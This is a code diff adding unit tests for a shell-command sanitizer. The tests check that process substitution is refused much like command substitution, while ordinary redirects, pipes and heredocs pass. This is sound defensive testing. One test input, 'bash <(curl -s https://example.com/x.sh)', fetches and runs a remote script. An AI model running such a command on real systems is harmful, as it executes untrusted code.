@@ -413,3 +413,60 @@ describe("sanitizer follows the resolved shell (8SO S1 S2 S3)", () => {
 		expect(refused("git status 2>&1", "powershell")).toBe(false);
 	});
 });
+
+describe("sanitizeShellCommand: process substitution is refused like command substitution (8SO)", () => {
+	const REASON = "Process substitution <(...) and >(...) is not allowed";
+	const ok = (c: string) => expect(sanitizeShellCommand(c, "linux")).toEqual({ safe: true });
+	const no = (c: string) => {
+		const r = sanitizeShellCommand(c, "linux");
+		expect(r.safe).toBe(false);
+		expect(r.reason).toBe(REASON);
+	};
+
+	test("<(...) is refused", () => {
+		no("cat <(ls)");
+		no("diff <(sort a) <(sort b)");
+		no("bash <(curl -s https://example.com/x.sh)");
+		no("cat < <(ls)");
+	});
+	test(">(...) is refused", () => {
+		no("ls | tee >(wc -l)");
+		no("echo x > >(cat)");
+		no("ls 2> >(logger)");
+	});
+	test("matches the $( quote handling: single quotes are data, double quotes and an escape are refused", () => {
+		ok("echo '<(id)'");
+		ok("echo '>(id)'");
+		ok("echo '<(id) ; x'");
+		ok("git commit -m 'see <(x)'");
+		no('echo "<(id)"');
+		no('echo ">(id)"');
+		no("echo 'x'<(id)");
+		no("echo \\<(id)");
+	});
+	test("a heredoc body is read like the line itself", () => {
+		no("cat <<EOF\n<(id)\nEOF");
+		no("cat <<EOF\nx >(id)\nEOF");
+	});
+	test("the strict dialects refuse it anywhere, as they do $(", () => {
+		for (const kind of ["cmd", "powershell"] as const) {
+			const r = sanitizeShellCommand("type <(dir)", "win32", kind);
+			expect(r.safe).toBe(false);
+			expect(r.reason).toBe(REASON);
+		}
+	});
+	test("plain redirects, pipes, heredocs and parentheses in words stay allowed", () => {
+		ok("ls | grep x > out.txt");
+		ok("cat < in.txt");
+		ok("ls 2>&1");
+		ok("ls > out.txt 2>&1");
+		ok("cat <<EOF\nhello\nEOF");
+		ok("grep -o 'name=csrf value=[a-f0-9]*' page.html");
+		ok("echo done (x)");
+		ok("bun test packages/tools");
+	});
+	test("the $( and backtick messages are unchanged", () => {
+		expect(sanitizeShellCommand("echo $(id)", "linux").reason).toBe("Command substitution $(...) is not allowed");
+		expect(sanitizeShellCommand("echo `id`", "linux").reason).toBe("Command substitution via backticks is not allowed");
+	});
+});
